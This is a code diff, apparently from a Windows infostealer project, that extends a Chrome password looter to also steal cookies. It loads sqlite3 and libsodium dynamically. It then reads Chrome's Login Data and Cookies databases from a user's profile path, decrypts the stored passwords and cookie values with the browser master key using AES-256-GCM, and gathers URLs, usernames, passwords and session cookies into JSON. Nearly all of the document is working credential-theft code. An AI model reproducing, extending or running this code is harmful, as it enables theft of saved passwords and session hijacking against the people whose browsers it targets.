@@ -14,13 +14,50 @@ using namespace std;
 
 string getEncryptedKey(string userName);
 string getLoginDataPath(string userName);
-void decryptPassword(const unsigned char* masterKey,
-	unsigned char* password_value, int passwordLen, unsigned char* decrypted);
+string getCookiesPath(string userName);
+void decryptWithAesGcm256(const unsigned char* masterKey,
+	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted);
 void initializeSodiumLibrary();
-json getRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
+json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
+json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
 
 HMODULE hSqlModule = LoadLibrary(TEXT("../libs/sqlite3/sqlite3.dll"));
 HMODULE hSodiumModule = LoadLibrary(TEXT("../libs/sodium/libsodium-23.dll"));
+
+// Define sqlite3 functions
+typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
+typedef const char* (*sqlite3_errmsg_t) (sqlite3*);
+typedef int (*sqlite3_close_t) (sqlite3*);
+typedef int (*sqlite3_prepare_v2_t) ( sqlite3 *db, const char *zSql, int nByte,
+	sqlite3_stmt **ppStmt, const char **pzTail);
+// typedef int (*sqlite3_bind_text_t) (sqlite3_stmt*,int,const char*,int,void(*)(void*));
+typedef int (*sqlite3_finalize_t) (sqlite3_stmt *pStmt);
+typedef int (*sqlite3_step_t) (sqlite3_stmt*);
+typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
+typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);
+
+// Get addresses sqlite3 functions from sqlite3 dll
+sqlite3_open_t sqlite3_open_ = (sqlite3_open_t) GetProcAddress(hSqlModule, "sqlite3_open");
+sqlite3_errmsg_t sqlite3_errmsg_ = (sqlite3_errmsg_t) GetProcAddress(hSqlModule, "sqlite3_errmsg");
+sqlite3_close_t sqlite3_close_ = (sqlite3_close_t) GetProcAddress(hSqlModule, "sqlite3_close");
+sqlite3_prepare_v2_t sqlite3_prepare_v2_ = (sqlite3_prepare_v2_t) GetProcAddress(hSqlModule, "sqlite3_prepare_v2");
+// sqlite3_bind_text_t sqlite3_bind_text_ = (sqlite3_bind_text_t) GetProcAddress(hSqlModule, "sqlite3_bind_text");
+sqlite3_finalize_t sqlite3_finalize_ = (sqlite3_finalize_t) GetProcAddress(hSqlModule, "sqlite3_finalize");
+sqlite3_step_t sqlite3_step_ = (sqlite3_step_t) GetProcAddress(hSqlModule, "sqlite3_step");
+sqlite3_column_text_t sqlite3_column_text_ = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
+sqlite3_column_bytes_t sqlite3_column_bytes_ = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");
+
+// Define crypto_aead_aes256gcm_decrypt
+typedef int (*crypto_aead_aes256gcm_decrypt_t) (unsigned char *m,
+	unsigned long long *mlen_p, unsigned char *nsec,
+	const unsigned char *c, unsigned long long clen,
+	const unsigned char *ad, unsigned long long adlen,
+	const unsigned char *npub, const unsigned char *k);
+
+// Get address of crypto_aead_aes256gcm_decrypt from sodium dll
+crypto_aead_aes256gcm_decrypt_t crypto_aead_aes256gcm_decrypt_
+	= (crypto_aead_aes256gcm_decrypt_t)
+		GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_decrypt");
 
 // Master key used for decrypting user passwords stored in Login Data sql file
 void getMasterKey(unsigned char* masterKey, string userName) {
@@ -69,30 +106,8 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 
 	json lootResult = json::array();
 
-	typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
-	typedef const char* (*sqlite3_errmsg_t) (sqlite3*);
-	typedef int (*sqlite3_close_t) (sqlite3*);
-	typedef int (*sqlite3_prepare_v2_t) ( sqlite3 *db, const char *zSql, int nByte,
-		sqlite3_stmt **ppStmt, const char **pzTail);
-	typedef int (*sqlite3_bind_text_t) (sqlite3_stmt*,int,const char*,int,void(*)(void*));
-	typedef int (*sqlite3_finalize_t) (sqlite3_stmt *pStmt);
-	typedef int (*sqlite3_step_t) (sqlite3_stmt*);
-	typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
-	typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);
-
-	sqlite3_open_t sqlite3_open = (sqlite3_open_t) GetProcAddress(hSqlModule, "sqlite3_open");
-	sqlite3_errmsg_t sqlite3_errmsg = (sqlite3_errmsg_t) GetProcAddress(hSqlModule, "sqlite3_errmsg");
-	sqlite3_close_t sqlite3_close = (sqlite3_close_t) GetProcAddress(hSqlModule, "sqlite3_close");
-	sqlite3_prepare_v2_t sqlite3_prepare_v2 = (sqlite3_prepare_v2_t) GetProcAddress(hSqlModule, "sqlite3_prepare_v2");
-	sqlite3_bind_text_t sqlite3_bind_text = (sqlite3_bind_text_t) GetProcAddress(hSqlModule, "sqlite3_bind_text");
-	sqlite3_finalize_t sqlite3_finalize = (sqlite3_finalize_t) GetProcAddress(hSqlModule, "sqlite3_finalize");
-	sqlite3_step_t sqlite3_step = (sqlite3_step_t) GetProcAddress(hSqlModule, "sqlite3_step");
-	sqlite3_column_text_t sqlite3_column_text = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
-	sqlite3_column_bytes_t sqlite3_column_bytes = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");
-
-	sqlite3 *db = nullptr;
-	char *zErrMsg = 0;
-	int errorCode = 0;
+	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
+	initializeSodiumLibrary();
 
 	// Get dbFile path
 	string loginDataPath = getLoginDataPath(userName);
@@ -101,11 +116,15 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	strncpy(dbFile, loginDataPath.c_str(), pathLen);
 	dbFile[pathLen] = '\0';
 
+	sqlite3 *db = nullptr;
+	char *zErrMsg = 0;
+	int errorCode = 0;
+
 	// Open database
-	errorCode = sqlite3_open(dbFile, &db);
+	errorCode = sqlite3_open_(dbFile, &db);
 
 	if (errorCode) {
-		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
 		json error = "Error";
 		return error;
 	} else {
@@ -117,8 +136,8 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	// Rob's answer
 	sqlite3_stmt* statement;
 	const char* statementStr = "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
-	if (sqlite3_prepare_v2(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
-    cout << "Prepare failure: %s\n" << sqlite3_errmsg(db) << endl;
+	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
+    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
 		json error = "Error";
 		return error;
 	}
@@ -126,18 +145,70 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	// Get results of statement
 	int stepResult;
 
-	while ((stepResult = sqlite3_step(statement)) == SQLITE_ROW) {
-		json rowData = getRowData(statement, masterKey);
+	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
+		json rowData = getPasswordRowData(statement, masterKey);
 		lootResult.push_back(rowData);
 	}
 
 	if (stepResult != SQLITE_DONE) {
-    cout << "Step failure: %s\n" << sqlite3_errmsg(db) << endl;
+    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
 	}
 
-	sqlite3_finalize(statement);
-  sqlite3_close(db);
+	sqlite3_finalize_(statement);
+  sqlite3_close_(db);
 
+	return lootResult;
+}
+
+
+json lootChromeCookies(const unsigned char* masterKey, string userName) {
+	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
+	initializeSodiumLibrary();
+	json lootResult = json::array();
+
+	// Get dbFile path
+	string cookiesPath = getCookiesPath(userName);
+	int pathLen = cookiesPath.length();
+	char dbFile[pathLen + 1];
+	strncpy(dbFile, cookiesPath.c_str(), pathLen);
+	dbFile[pathLen] = '\0';
+
+	sqlite3 *db = nullptr;
+	char *zErrMsg = 0;
+	int errorCode = 0;
+
+	// Open database
+	errorCode = sqlite3_open_(dbFile, &db);
+
+	if (errorCode) {
+		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
+		json j = "error";
+		return j;
+	} else {
+		fprintf(stderr, "Opened database successfully\n");
+	}
+
+	sqlite3_stmt* statement;
+	const char* statementStr = "SELECT host_key, name, encrypted_value, path, expires_utc, source_port FROM cookies ORDER BY host_key";
+	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
+    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
+		json j = "error";
+		return j;
+	}
+
+	int stepResult;
+
+	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
+		json rowData = getCookieRowData(statement, masterKey);
+		lootResult.push_back(rowData);
+	}
+
+	if (stepResult != SQLITE_DONE) {
+    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
+	}
+
+	sqlite3_finalize_(statement);
+  sqlite3_close_(db);
 	return lootResult;
 }
 
@@ -164,51 +235,47 @@ string getEncryptedKey(string userName) {
 	return encryptedKey;
 }
 
-// Stores website login info (url, username, password)
+// This path stores website login info (url, username, password)
 string getLoginDataPath(string userName) {
 	std::ostringstream stream;
   stream << "C:\\Users\\"
 		<< userName
-		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\0";
+		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+
+	string path = stream.str();
+	return path;
+}
+
+string getCookiesPath(string userName) {
+	std::ostringstream stream;
+  stream << "C:\\Users\\"
+		<< userName
+		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
 
 	string path = stream.str();
 	return path;
 }
 
 // Login Data contains encrypted passwords, need to decrypt using master key
-void decryptPassword(const unsigned char* masterKey,
-	unsigned char* password_value, int passwordLen, unsigned char* decrypted) {
-
-	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
-	initializeSodiumLibrary();
-
-	// Define crypto_aead_aes256gcm_decrypt
-	typedef int (*crypto_aead_aes256gcm_decrypt_t) (unsigned char *m,
-	  unsigned long long *mlen_p, unsigned char *nsec,
-	  const unsigned char *c, unsigned long long clen,
-	  const unsigned char *ad, unsigned long long adlen,
-	  const unsigned char *npub, const unsigned char *k);
-
-	// Get address of crypto_aead_aes256gcm_decrypt from sodium dll
-	crypto_aead_aes256gcm_decrypt_t crypto_aead_aes256gcm_decrypt
-		= (crypto_aead_aes256gcm_decrypt_t)
-			GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_decrypt");
+void decryptWithAesGcm256(const unsigned char* masterKey,
+	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted) {
 
 	// Prepare parameters for decryption function
 	unsigned long long decryptedLen = 0;
 
 	int ivLen = 12;
 	BYTE iv[ivLen];
-	memcpy(iv, &password_value[3], ivLen);
+	memcpy(iv, &encrypted[3], ivLen);
 
-	int ciphertextLen = ((int) passwordLen) - 15;
+	int ciphertextLen = ((int) encryptedLen) - 15;
 	BYTE ciphertext[ciphertextLen];
+
 	memset(ciphertext, 0, ciphertextLen);
-	memcpy(ciphertext, &password_value[15], ciphertextLen);
+	memcpy(ciphertext, &encrypted[15], ciphertextLen);
 
 	// Reference: https://libsodium.gitbook.io/doc/secret-key_cryptography/aead/aes-256-gcm#example-combined-mode
 	// Decrypt to get user's password
-	bool decryptFailed = crypto_aead_aes256gcm_decrypt(
+	bool decryptFailed = crypto_aead_aes256gcm_decrypt_(
 		decrypted,
 		&decryptedLen,
 		NULL,
@@ -222,7 +289,6 @@ void decryptPassword(const unsigned char* masterKey,
 
 	if (decryptFailed) {
 		cout << "crypto_aead_aes256gcm_decrypt failed" << endl;
-		abort();
 	}
 
 	decrypted[decryptedLen] = '\0';
@@ -249,22 +315,15 @@ void initializeSodiumLibrary() {
 	}
 }
 
-json getRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
-	// Define sqlite3 functions
-	typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
-	typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);
+json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
 
-	// Get addresses sqlite3 functions from sqlite3 dll
-	sqlite3_column_text_t sqlite3_column_text = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
-	sqlite3_column_bytes_t sqlite3_column_bytes = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");
-
-	unsigned char* original_url = (unsigned char*) sqlite3_column_text(statement, 0);
-	unsigned char* username_value = (unsigned char*) sqlite3_column_text(statement, 1);
-	unsigned char* password_value = (unsigned char*) sqlite3_column_text(statement, 2);
-	int passwordLen = sqlite3_column_bytes(statement, 2);
+	unsigned char* original_url = (unsigned char*) sqlite3_column_text_(statement, 0);
+	unsigned char* username_value = (unsigned char*) sqlite3_column_text_(statement, 1);
+	unsigned char* password_value = (unsigned char*) sqlite3_column_text_(statement, 2);
+	int passwordLen = sqlite3_column_bytes_(statement, 2);
 
 	unsigned char decryptedPassword[50];
-	decryptPassword(masterKey, password_value, passwordLen, decryptedPassword);
+	decryptWithAesGcm256(masterKey, password_value, passwordLen, decryptedPassword);
 
 	string originalUrl(reinterpret_cast<char*>(original_url));
 	string usernameValue(reinterpret_cast<char*>(username_value));
@@ -274,6 +333,39 @@ json getRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
 		{"original_url", originalUrl},
 		{"username_value", usernameValue},
 		{"password_value", passwordValue}
+	};
+
+	return rowData;
+}
+
+json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
+
+	unsigned char* host_key = (unsigned char*) sqlite3_column_text_(statement, 0);
+	unsigned char* name = (unsigned char*) sqlite3_column_text_(statement, 1);
+	unsigned char* encrypted_value = (unsigned char*) sqlite3_column_text_(statement, 2);
+	unsigned char* path = (unsigned char*) sqlite3_column_text_(statement, 3);
+	unsigned char* expires_utc = (unsigned char*) sqlite3_column_text_(statement, 4);
+	unsigned char* source_port = (unsigned char*) sqlite3_column_text_(statement, 5);
+	int encrypted_value_len = sqlite3_column_bytes_(statement, 2);
+
+	unsigned char decryptedValue[1000];
+	decryptWithAesGcm256(masterKey, encrypted_value, encrypted_value_len, decryptedValue);
+
+	// Convert to strings so that they could be added to a json structure
+	string host_key_s(reinterpret_cast<char*>(host_key));
+	string name_s(reinterpret_cast<char*>(name));
+	string decrypted_value_s(reinterpret_cast<char*>(decryptedValue));
+	string path_s(reinterpret_cast<char*>(path));
+	string expires_utc_s(reinterpret_cast<char*>(expires_utc));
+	string source_port_s(reinterpret_cast<char*>(source_port));
+
+	json rowData = {
+		{"host_key", host_key_s},
+		{"name", name_s},
+		{"decrypted_value", decrypted_value_s},
+		{"path", path_s},
+		{"expires_utc", expires_utc_s},
+		{"source_port", source_port_s}
 	};
 
 	return rowData;
